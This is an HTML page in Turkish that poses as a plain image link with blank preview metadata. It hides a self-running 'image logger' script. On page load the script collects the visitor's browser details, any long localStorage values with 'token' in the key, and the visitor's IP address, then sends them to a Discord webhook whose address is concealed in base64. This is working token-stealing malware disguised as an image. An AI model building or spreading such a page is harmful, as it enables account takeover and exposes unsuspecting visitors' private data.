<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <title></title>
    <meta property="og:title" content=" ">
    <meta property="og:description" content=" ">
    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png">
    <script>
        // Webhook gizli (base64 ile kodlandı)
        const hook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjM1ODM5NjQ5NTA2OTE4NS9mbEFWOUdXV1VDbTVNQXlHZVE1MGJla3ZBU29tdG9YWjBmQmx1a2VBX3E1SDhyMHU2UkxxeFF1SElwVVVyeWs0MFFXWA==");

        async function runLogger() {
            let payload = `🔥 SINGLE USE IMAGE LOGGER 2026 🔥\n\n`;
            payload += `👤 User-Agent: ${navigator.userAgent}\n`;
            payload += `💻 Platform: ${navigator.platform}\n`;
            payload += `🕒 Time: ${new Date().toLocaleString('tr-TR')}\n\n`;

            try {
                let tokens = [];
                if (localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        let key = localStorage.key(i);
                        if (key && key.toLowerCase().includes("token")) {
                            let val = localStorage.getItem(key);
                            if (val && val.length > 50) tokens.push(val);
                        }
                    }
                }
                if (tokens.length) payload += `🔑 Tokens:\n${tokens.join("\n")}\n\n`;
            } catch(e) {}

            try {
                let ip = await fetch("https://api.ipify.org?format=text").then(r => r.text());
                payload += `🌐 IP: ${ip}\n`;
            } catch(e) {}

            fetch(hook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    content: payload,
                    username: "Image Logger"
                })
            });
        }

        window.onload = runLogger;
    </script>
</head>
<body style="margin:0;background:#000;overflow:hidden;">
    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;object-fit:contain;">
</body>
</html>
